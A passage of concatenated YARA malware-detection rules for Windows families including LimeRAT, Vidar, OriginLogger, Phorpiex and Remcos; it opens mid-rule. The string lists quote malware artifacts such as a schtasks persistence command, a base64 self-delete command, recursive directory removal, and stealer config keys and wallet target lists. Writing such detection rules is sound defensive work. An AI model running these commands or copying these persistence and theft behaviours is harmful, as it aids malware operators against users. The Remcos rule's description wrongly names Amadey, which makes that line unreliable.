        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "3afb4573dea2dbac4bb5f1915f7a4dce"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
	yarahub_uuid              = "5f272188-cabb-441a-8278-b9b82fe4d653"


    strings:
        $func_names_0 = "main.request"
        $func_names_1 = "main.setOnline"
        $func_names_2 = "main.getRegex"
        $func_names_3 = "main.getAddress"
        $func_names_4 = "main.waitOpenClipboard"
        $func_names_5 = "main.clipboardRead"
        $func_names_6 = "main.clipboardWrite"
        $func_names_7 = "main.startHandler"
        $func_names_8 = "main.isRunning"
        $func_names_9 = "main.main"
        $func_names_10 = "main.isStartupEnabled"
        $func_names_11 = "main.decrypt"
        $func_names_12 = "main.existsPath"
        $func_names_13 = "main.getPid"
        $func_names_14 = "main.writePid"
        $func_names_15 = "main.enableStartup"
        $func_names_16 = "main.copyFile"
        $func_names_17 = "main.clipboardWrite.func1"
        $func_names_18 = "main.init"

        $startup_0 = "/sc"
        $startup_1 = "/ri"
        $startup_2 = "/st"
        $startup_3 = "/tr"
        $startup_4 = "/tn"
        $startup_5 = "/create"
        $startup_6 = "/C"
        $startup_7 = "once"
        $startup_8 = "cmd.exe"
        $startup_9 = "9999:59"
        $startup_10 = "00:00"

        $request_0 = "http://"
        $request_1 = "/bot/"
        $request_2 = "key="

    condition:
        uint16(0) == 0x5A4D and
        17 of ($func_names_*)  and
        9 of ($startup_*) and
        all of ($request_*)
}
rule win_limerat_j1_00cfd931 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2021-10-01"
        description               = "detects the lime rat"
        hash                      = "2a0575b66a700edb40a07434895bf7a9"
        malpedia_family           = "win.limerat"
        tlp                       = "TLP:WHITE"
        version                   = "v1.1"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "2a0575b66a700edb40a07434895bf7a9"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "00cfd931-3e03-4e32-b0d7-ca8f6bbfe062"

    strings:
        $str_1 = "Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=" wide
        $str_2 = "schtasks /create /f /sc ONLOGON /RL HIGHEST /tn LimeRAT-Admin" wide
        $str_3 = "Minning..." wide
        $str_4 = "--donate-level=" wide

    condition:
        uint16(0) == 0x5A4D and
        3 of them
}
rule win_lu0bot_loader_1d53 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2023-03-08"
        description               = "detects the loader of the Lu0bot malware"
        hash_md5                  = "c5eb9c6ded323a8db7eb739e514bb46c"
        hash_sha1                 = "cede3aa5e1821a47f416c64bc48d1aab72eb48ca"
        hash_sha256               = "5a2283a997ab6a9680b69f9318315df3c9e634b3c4dd4a46f8bc5df35fc81284"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "c5eb9c6ded323a8db7eb739e514bb46c"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "1d536a34-2111-40fe-aea8-d8e9062dfe8b"

    strings:
        /*
            add     edi, ?h
            sub     dword ptr [esi], <4 byte key>
            add     esi, 4
            (optional mov)
            cmp     esi, edi
        */
        $decryption = { 81 C7 ?? 0? 00 00
                        81 2E ?? ?? ?? ??
                        83 C6 04
                        [0-4]
                        39 FE}
        /*
            mov     ebx, 0
            push    ebx
            push    eax
            mov     eax, offset WinExec
            call    dword ptr [eax]
        */
        $winexec    = { BB 00 00 00 00
                        53
                        50
                        B8 ?? ?? ?? ??
                        FF 10}
        /*

            mov     eax, 0
            push    eax
            call    ExitProcess
        */
        $exit       = { B8 00 00 00 00
                        50
                        E8}

    condition:
        (uint16(0) == 0x5A4D) and
        $decryption and
        $winexec and
        $exit
}
import "pe"

rule win_matanbuchus : loader 
{
  meta:
    description =               "Detects Matanbuchus MaaS loader and core"
    author =                    "andretavare5"
    org =                       "BitSight"
    date =                      "2022-07-15"
    yarahub_author_twitter =    "@andretavare5"
    yarahub_reference_link =    "https://research.openanalysis.net/matanbuchus/loader/yara/triage/dumpulator/emulation/2022/06/19/matanbuchus-triage.html"
    yarahub_malpedia_family =   "win.matanbuchus"
    yarahub_uuid =              "0857d7bd-4d9c-478b-a11c-e80fbf948c74"
    yarahub_license =           "CC BY-NC-SA 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp =  "TLP:WHITE"
    yarahub_reference_md5 =     "8fc15b030254c0d49f18d06c696d6986"

  strings:
    $fowler_noll_vo_hash = {C5 9D 1C 81 [1-100] 93 01 00 01}

    // encrypted stack string of size 65 (ex: b64 alphabet + \x00)
    $x1 = /\xC7\x45.\x41\x00\x00\x00(\xC6\x45..){65}/  
    // C7 45 F8 0A 00 00 00     mov  DWORD PTR  [ebp+var_8], 65 ; str size
    // C6 45 F0 22              mov  BYTE PTR   [ebp+var_10], 22h  ; 65 movs
    
    // encrypted stack string of size >= 10 and last encrypted byte is 1
    $x2 = /\xC7\x45..\x00\x00\x00(\xC6\x45..){10,}\xC6\x45.\x01/

  condition:
    uint16(0) == 0x5A4D and // MZ
    pe.characteristics & pe.DLL and 
    filesize < 1MB and 
    $fowler_noll_vo_hash and 
    any of ($x*)
}rule win_modern_loader_v1_01_1edf {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-12-08"
        description               = "matches unpacked ModernLoader samples"
        hash_md5                  = "c6897769c0af03215d61e8e63416e5fc"
        hash_sha1                 = "12261b515dabba8a5bb0daf0a904792d3acd8f9b"
        hash_sha256               = "ceae593f359a902398e094e1cdbc4502c8fd0ba6b71e625969da6df5464dea95"
        malpedia_family           = "win.modern_loader"
        tlp                       = "TLP:WHITE"
        version                   = "v1.01"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "c6897769c0af03215d61e8e63416e5fc"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "1edff524-1b52-494c-8d61-3daf5998b8cc"

    strings:
        $log_01 = "[DEBUG] Download & Execute Content: <" wide
        $log_02 = "[DEBUG] Execute Content: <" wide
        $log_03 = "[DEBUG] Init Completed Response: <" wide
        $log_04 = "[DEBUG] Listen Response: <" wide
        $log_05 = "[DEBUG] Task Completed Response: <" wide
        $log_06 = "[DEBUG] Task Failed Response: <" wide
        $log_07 = "[DEBUG] Task Result: <" wide
        $log_08 = "[ERROR] Creating Request Failed" wide
        $log_09 = "[ERROR] Listen Failed" wide
        $log_10 = "[ERROR] No available tasks or tasks parsing error" wide
        $log_11 = "[ERROR] Reading Response Failed" wide

        $fingerprint_1 = "\"AntiVirus\":\"N/A\"," wide
        $fingerprint_2 = "\"CORP\":\"N/A\"," wide
        $fingerprint_3 = "\"Network PCs\":\"N/A\"}" wide
        $fingerprint_4 = "\"RDP\":\"" wide
        $fingerprint_5 = "\"Role\":\"Admin\"," wide
        $fingerprint_6 = "\"Role\":\"User\"," wide
        $fingerprint_7 = "\"Total Space\":\"" wide
        $fingerprint_8 = "\"Version\":\"" wide

        $varia_01 = "%XBoxLive%" wide
        $varia_02 = "AddressWidth" wide
        $varia_03 = "C:\\Users\\Public\\Documents\\Data\\hidden_service\\hostn" wide
        $varia_04 = "Download & Execute" wide
        $varia_05 = "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CENT" wide
        $varia_06 = "ProcessorNameString" wide
        $varia_07 = "RALPROCESSOR\\0" wide
        $varia_08 = "Win32_ComputerSystem" wide
        $varia_09 = "partofdomain" wide
        $varia_10 = "root\\SecurityCenter2" wide

        $sql_1 = "SELECT * FROM AntivirusProduct" wide
        $sql_2 = "SELECT * FROM Win32_DisplayConfiguration" wide
        $sql_3 = "SELECT Caption FROM Win32_OperatingSystem" wide
        $sql_4 = "SELECT UUID FROM Win32_ComputerSystemProduct" wide
        $sql_5 = "select * from Win32_Processor" wide

    condition:
        uint16(0) == 0x5A4D and
        (
            30 of them
        )
}
rule win_origin_logger_b5c8 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-09-22"
        description               = "detects Orign Logger"
        hash_md5                  = "bd9981b13c37d3ba04e55152243b1e3e"
        hash_sha1                 = "4669160ec356a8640cef92ddbaf7247d717a3ef1"
        hash_sha256               = "595a7ea981a3948c4f387a5a6af54a70a41dd604685c72cbd2a55880c2b702ed"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "bd9981b13c37d3ba04e55152243b1e3e"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "b5c88eec-323f-46eb-b8c3-9cf5d8ca0e1f"

    strings:
        $name           = "OriginLogger" wide
        $exe            = "OriginLogger.exe" wide
        $cfg_section_0  = "[LOGSETTINGS]"
        $cfg_section_1  = "[ASSEMBLY]"
        $cfg_section_2  = "[STEALER]"
        $cfg_section_3  = "[BINDER]"
        $cfg_section_4  = "[INSTALLATION]"
        $cfg_section_5  = "[OPTIONS]"
        $cfg_section_6  = "[DOWNLOADER]"
        $cfg_section_7  = "[EXTENSION]"
        $cfg_section_8  = "[FILEPUMPER]"
        $cfg_section_9  = "[FAKEMSG]"
        $cfg_section_10 = "[HOST]"
        $cfg_section_11 = "[BUILD]"
        $cfg_entries_0  = "BinderON="
        $cfg_entries_1  = "blackhawk="
        $cfg_entries_2  = "centbrowser="
        $cfg_entries_3  = "chedot="
        $cfg_entries_4  = "citrio="
        $cfg_entries_5  = "clawsmail="
        $cfg_entries_6  = "CloneON="
        $cfg_entries_7  = "coccoc="
        $cfg_entries_8  = "Coolnovo="
        $cfg_entries_9  = "coowon="
        $cfg_entries_10 = "cyberfox="
        $cfg_entries_11 = "Delaysec="
        $cfg_entries_12 = "dest_date="
        $cfg_entries_13 = "Disablecp="
        $cfg_entries_14 = "Disablemsconfig="
        $cfg_entries_15 = "Disablesysrestore="
        $cfg_entries_16 = "DownloaderON="
        $cfg_entries_17 = "emclient="
        $cfg_entries_18 = "epicpb="
        $cfg_entries_19 = "estensionON="
        $cfg_entries_20 = "Eudora="
        $cfg_entries_21 = "falkon="
        $cfg_entries_22 = "FileassemblyON="
        $cfg_entries_23 = "FlashFXP="
        $cfg_entries_24 = "FPRadiobut="
        $cfg_entries_25 = "HostON="
        $cfg_entries_26 = "icecat="
        $cfg_entries_27 = "icedragon="
        $cfg_entries_28 = "IconON="
        $cfg_entries_29 = "IncrediMail="
        $cfg_entries_30 = "iridium="
        $cfg_entries_31 = "JustOne="
        $cfg_entries_32 = "kmeleon="
        $cfg_entries_33 = "kometa="
        $cfg_entries_34 = "liebao="
        $cfg_entries_35 = "orbitum="
        $cfg_entries_36 = "palemoon="
        $cfg_entries_37 = "pumderON="
        $cfg_entries_38 = "pumpertext="
        $cfg_entries_39 = "qqbrowser="
        $cfg_entries_40 = "screeninterval="
        $cfg_entries_41 = "SelectFolder="
        $cfg_entries_42 = "sleipnir="
        $cfg_entries_43 = "SmartLogger="
        $cfg_entries_44 = "smartLoggerType="
        $cfg_entries_45 = "SmartWords="
        $cfg_entries_46 = "sputnik="
        $cfg_entries_47 = "telegram_api="
        $cfg_entries_48 = "telegram_chatid="
        $cfg_entries_49 = "toemail="
        $cfg_entries_50 = "trillian="
        $cfg_entries_51 = "UCBrowser="
        $cfg_entries_52 = "USBSpread="
        $cfg_entries_53 = "vivaldi="
        $cfg_entries_54 = "waterfox="
        $cfg_entries_55 = "WebFilterON="

    condition:
        uint16(0) == 0x5A4D and
        (#name >= 4 or #exe >= 2) and
        10 of ($cfg_section_*)  and
        50 of ($cfg_entries_*)
    }
rule win_phorpiex_a_84fc {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-12-13"
        description               = "detects unpacked Phorpiex samples"
        hash_md5                  = "6b6398fa7d461b09b8652ec0f8bafeb4"
        hash_sha1                 = "43bf88ea96bb4de9f4bbc66686820260033cd2d7"
        hash_sha256               = "bd2976d327a94f87c933a3632a1c56d0050b047506f5146b1a47d2b9fd5b798d"
        malpedia_family           = "win.phorpiex"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "6b6398fa7d461b09b8652ec0f8bafeb4"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "84fc2940-d204-4d75-9f17-89cce6b1dea2"

    strings:
        $str_1 = ":--tLdr--:"
        $str_2 = "T-449505056674060607" wide

        $path_1 = "\\public_html" wide
        $path_2 = "\\htdocs" wide
        $path_3 = "\\httpdocs" wide
        $path_4 = "\\wwwroot" wide
        $path_5 = "\\ftproot" wide
        $path_6 = "\\share" wide
        $path_7 = "\\income" wide
        $path_8 = "\\upload" wide

        $cmd_0 = "/c start _ & _\\DeviceManager.exe & exit" wide
        $cmd_1 = "%ls\\_\\DeviceConfigManager.exe" wide
        $cmd_2 = "%ls\\_\\DeviceManager.exe" wide
        $cmd_3 = "/c rmdir /q /s \"%ls\"" wide
        $cmd_4 = "/c move /y \"%ls\", \"%ls\"" wide

    condition:
        uint16(0) == 0x5A4D and
        all of ($str*) or
        all of ($path*) or
        all of ($cmd*)
}
rule win_tofsee_bot
{
  meta:
    author       = "akrasuski1"
    published_at = "https://gist.github.com/akrasuski1/756ae39f96d2714087e6d7f252a95b19"
    revision_by  = "andretavare5"
    description  = "Tofsee malware"
    org          = "BitSight"
    date         = "2023-03-24"
	yarahub_author_twitter =    "@andretavare5"
    yarahub_reference_link =    "https://www.bitsight.com/blog/tofsee-botnet-proxying-and-mining"
    yarahub_malpedia_family =   "win.tofsee"
    yarahub_uuid =              "bc8f6b49-01a2-467a-a619-960fc2cb5f7f"
    yarahub_license =           "CC BY-NC-SA 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp =  "TLP:WHITE"
    yarahub_reference_md5 =     "92e466525e810b79ae23eac344a52027"

  strings:
    $decryptStr  = {32 55 14 88 10 8A D1 02 55 18 F6 D9 00 55 14}
    $xorGreet    = {C1 EB 03 C0 E1 05 0A D9 32 DA 34 C6 88 1E}
    $xorCrypt    = {F7 FB 8A 44 0A 04 30 06 FF 41 0C}
    $string_res1 = "loader_id"
    $string_res2 = "born_date"
    $string_res3 = "work_srv"
    $string_res4 = "flags_upd"
    $string_res5 = "lid_file_upd"
    $string_res6 = "localcfg"
    $string_var0 = "%RND_NUM"
    $string_var1 = "%SYS_JR"
    $string_var2 = "%SYS_N"
    $string_var3 = "%SYS_RN"
    $string_var4 = "%RND_SPACE"
    $string_var5 = "%RND_DIGIT"
    $string_var6 = "%RND_HEX"
    $string_var7 = "%RND_hex"
    $string_var8 = "%RND_char"
    $string_var9 = "%RND_CHAR"

  condition:
    (7 of ($string_var*) 
      and 4 of ($string_res*)) 
    or (7 of ($string_var*) 
      and 2 of ($decryptStr, $xorGreet, $xorCrypt)) 
    or (4 of ($string_res*) 
      and 2 of ($decryptStr, $xorGreet, $xorCrypt))
}rule win_vidar_a_a901 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2023-03-30"
        description               = "detect unpacked Vidar samples"
        hash_md5                  = "ed4ddd89e6ab5211cd7fdbfe51d9576b"
        hash_sha1                 = "7b6beb9870646bc50b10014536ed3bb088a2e3de"
        hash_sha256               = "352f8e45cd6085eea17fffeeef91251192ceaf494336460cc888bbdd0051ec71"
        malpedia_family           = "win.vidar"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "ed4ddd89e6ab5211cd7fdbfe51d9576b"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "a901638e-af37-42a0-a4c5-8f20d4a7e148"

    strings:
        $leet_sleep  = {6A 01 FF D6 6A 03 FF D6 6A 03 FF D6 6A 07 FF D6}

        $wallets_01 = "Enkrypt"
        $wallets_02 = "Braavos"
        $wallets_03 = "Exodus Web3 Wallet"
        $wallets_04 = "Trust Wallet"
        $wallets_05 = "Tronium"
        $wallets_06 = "Opera Wallet"
        $wallets_07 = "OKX Web3 Wallet"
        $wallets_08 = "Sender"
        $wallets_09 = "Hashpack"
        $wallets_10 = "Eternl"
        $wallets_11 = "GeroWallet"
        $wallets_12 = "Pontem Wallet"
        $wallets_13 = "Martian Wallet"
        $wallets_14 = "Finnie"
        $wallets_15 = "Leap Terra"
        $wallets_16 = "Microsoft AutoFill"
        $wallets_17 = "Bitwarden"
        $wallets_18 = "KeePass Tusk"
        $wallets_19 = "KeePassXC-Browser"

        $telegram_1 = "shortcuts-default.json"
        $telegram_2 = "shortcuts-custom.json"
        $telegram_3 = "settingss"
        $telegram_4 = "prefix"
        $telegram_5 = "countries"
        $telegram_6 = "usertag"

        $scp = "Software\\Martin Prikryl\\WinSCP 2\\Configuration" wide

    condition:
        uint16(0) == 0x5A4D and
        (
            #leet_sleep > 10 and
            (16 of ($wallets_*) and all of ($telegram_*) and $scp)
        )
}
rule win_xfiles_stealer_a8b373fb {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-04-15"
        description               = "detects XFiles-Stealer"
        hash                      = "d06072f959d895f2fc9a57f44bf6357596c5c3410e90dabe06b171161f37d690"
        hash2                     = "1ed070e0d33db9f159a576e6430c273c"
        malpedia_family           = "win.xfilesstealer"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "1ed070e0d33db9f159a576e6430c273c"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "a8b373fb-337a-4c3c-9387-78c294c8017d"

    strings:
        $ad_1 = "Telegram bot - @XFILESShop_Bot" wide
        $ad_2 = "Telegram support - @XFILES_Seller" wide

        $names_1 = "XFiles.Models.Yeti"
        $names_2 = "anti_vzlom_popki" // анти взлом попки
        $names_3 = "assType"
        $names_4 = "hackrjaw"

        $upload_1  = "zipx" wide
        $upload_2  = "user_id" wide
        $upload_3  = "passworlds_x" wide
        $upload_4  = "ip_x" wide
        $upload_5  = "cc_x" wide
        $upload_6  = "cookies_x" wide
        $upload_7  = "zip_x" wide
        $upload_8  = "contry_x" wide
        $upload_9  = "tag_x" wide
        $upload_10 = "piece" wide

    condition:
        uint16(0) == 0x5A4D and
        (
            all of ($ad_*) or
            all of ($names_*) or
            all of ($upload_*)
        )
}
rule win_xwormmm_s1_6f74 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-11-13"
        description               = "detects unpacked Xwormmm samples"
        hash1_md5                 = "6005e1ccaea62626a5481e09bbb653da"
        hash1_sha1                = "74138872ec0d0791b7f58eda8585250af40feaf9"
        hash1_sha256              = "7fc6a365af13150e7b1738129832ebd91f1010705b0ab0955a295e2c7d88be62"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "6005e1ccaea62626a5481e09bbb653da"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "6f74e598-0f7c-42f4-9730-1925d1b08ebe"

    strings:
        $str_01 = "Mutexx"
        $str_02 = "USBS"
        $str_03 = "_appMutex"
        $str_04 = "dTimer2"
        $str_05 = "dosstu"
        $str_06 = "nameee"
        $str_07 = "ruta"
        $str_08 = "usbSP"
        $str_09 = "GetEncoderInfo"
        $str_10 = "AppendOutputText"
        $str_11 = "capCreateCaptureWindowA"
        $str_12 = "capGetDriverDescriptionA"
        $str_13 = "MyProcess_ErrorDataReceived"
        $str_14 = "MyProcess_OutputDataReceived"
        $str_15 = "STOBS64"
        $str_16 = "keybd_event"
        $str_17 = "AES_Decryptor"
        $str_18 = "AES_Encryptor"
        $str_19 = "tickees"
        $str_20 = "INDATE"
        $str_21 = "GetHashT"
        $str_22 = "isDisconnected"

        $str_23   = "PING?" wide
        $str_24   = "IsInRole" wide
        $str_25   = "Select * from AntivirusProduct" wide
        $str_26   = "FileManagerSplitFileManagerSplit" wide
        $str_27   = "\nError: " wide
        $str_28   = "[Folder]" wide

        $str_29    = "XKlog.txt" wide
        $str_30    = "<Xwormmm>" wide
        $str_32    = "GfvaHzPAZuTqRREB" wide

    condition:
        uint16(0) == 0x5A4D and
        (
            20  of ($str*)
        )
}
rule yarahub_win_mystic_stealer_bytecodes_sep_2023
{ 
	meta:
		author = "Matthew @ Embee_Research"
		yarahub_author_twitter = "@embee_research"
		desc = "Bytecodes present in mystic stealer"
		sha_256 = "ef9fce75334befe0b435798c0b61dab1239ea5bc62b97654943676dd96dc6318"
		sha_256 = "36d8cb1447e2c5da60d2b86bf29856919c25f8e71a17f1d0d61d03c5e0505e4b"
		sha_256 = "e907c22288dacb37efa07481fef7a0d4ec0ce42954f12b2572ea7f5ffeecf313"
		date = "2023-09-21"
        yarahub_uuid = "3f5bd71e-b3e0-4199-a071-fe8692e18bed"
       	yarahub_license = "CC BY-NC 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "fa39f2f66ea81c985caf7a3aca53d7eb"
        malpedia_family = "win.mystic_stealer"
	
	
	
	strings:
		
		$s1 = {99 d3 d8 c5}
		$s2 = {99 b7 66 df}
		$s3 = {cb 45 92 f8}
		$s4 = {7b cc e1 54}
		$s5 = {7b 9c 29 17}
		$s6 = {01 c4 fb 83}
		$s7 = {b6 0f 74 e3}
		$s8 = {93 58 b5 ee}
		$s9 = {81 d9 df be}
		$s10 = {7b d8 62 00}
		$s12 = {81 d9 df be}
		$s13 = {7b d8 62 00}
		$s14 = {77 4a bc ac}
		
	condition:
	
		(all of them)

}
import "dotnet"


rule yarahub_win_njrat_bytecodes_V2_oct_2023
{
	meta:
		author = "Matthew @ Embee_Research"
		yarahub_author_twitter = "@embee_research"
		desc = "Bytecodes present in njrat malware"
		sha_256 = "9877fc613035d533feda6adc6848e183bf8c8660de3a34b1acd73c75e62e2823"
		sha_256 = "40f07bdfb74e61fe7d7973bcd4167ffefcff2f8ba2ed6f82e9fcb5a295aaf113"
		date = "2023-09-13"
        yarahub_uuid = "f514233e-7b4c-4efe-81ad-eaf069a35ba4"
       	yarahub_license = "CC BY-NC 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "68ba6d9812051a668115149f195b1956"
        malpedia_family = "win.njrat"
		
		
		
	strings:
		$s1 = {03 1F 72 2E ?? 03 1F 73 2E ?? 03 1F 74 2E ?? 03 1F 75 2E ?? 03 1F 76 2E ?? }
		$s2 = {0B 14 0C 16 0D 16 13 ?? 16 13 ?? 14}
		

	condition:
		dotnet.is_dotnet
		
		and
	
		(all of ($s*))
		

}
rule yarahub_win_remcos_rat_unpacked_aug_2023
{
	meta:
		author = "Matthew @ Embee_Research"
		yarahub_author_twitter = "@embee_research"
		desc = "Detects bytecodes present in Amadey Bot Samples"
		sha_256 = "ec901217558e77f2f449031a6a1190b1e99b30fa1bb8d8dabc3a99bc69833784"
		date = "2023-08-27"
        yarahub_uuid = "f701cf05-ac09-44f3-b4ee-3ea944bd5533"
       	yarahub_license = "CC BY-NC 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "57b00a449fc132c2f5d139c6d1cee7cd"
        malpedia_family = "win.remcos"
		
	strings:
		$r0 = " ______                              " ascii
		$r1 = "(_____ \\                             " ascii
		$r2 = " _____) )_____ ____   ____ ___   ___ " ascii 
		$r3 = "|  __  /| ___ |    \\ / ___) _ \\ /___)" ascii
		$r4 = "| |  \\ \\| ____| | | ( (__| |_| |___ |" ascii
		$r5 = "|_|   |_|_____)_|_|_|\\____)___/(___/ " ascii
		
		$s1 = "Watchdog module activated" ascii
		$s2 = "Remcos restarted by watchdog!" ascii
		$s3 = " BreakingSecurity.net" ascii

	condition:
		(
			(all of ($r*)) or (all of ($s*))
		)
}
rule yarahub_win_stealc_bytecodes_oct_2023
{
	meta:
		author = "Matthew @ Embee_Research"
		yarahub_author_twitter = "@embee_research"
		desc = "Bytecodes present in Stealc decoding routine"
		sha_256 = "74ff68245745b9d4cec9ef3c539d8da15295bdc70caa6fdb0632acdd9be4130a"
		sha_256 = "9f44a4cbc30e7a05d7eb00b531a9b3a4ada5d49ecf585b48892643a189358526"
		date = "2023-10-13"
        yarahub_uuid = "614538a7-d5da-4d98-9fc3-6cf4d2f10fb4"
       	yarahub_license = "CC BY-NC 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "768a03270a3ac83610a382bc18ee0021"
        malpedia_family = "win.stealc"
		
	strings:
		$s1 = {8b 4d f0 89 4d f8 8b 45 f8 c1 e0 03 33 d2 b9 06 00 00 00 f7 f1 8b e5 5d c2 04 00}
		
		
	condition:
		
		$s1

}rule ZPAQ {

  meta:
      description = "Detects files commpressed with ZPAQ alg."
      date = "2023-10-03"
      yarahub_reference_md5 = "72b8f5d6ed58add5bf34b7d051ce40b3"
      yarahub_uuid = "a10f3c0d-4f17-473d-8453-c82cc22e2c82"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"

  strings:
      $start_a = { 37 6b 53 74 a0 31 83 d3 8c b2 28 b0 d3 7a 50 51 02 01 07 00 00 00 00 00 00 00 00 01 6a 44 43 32 }

  condition:
      $start_a at 0
}
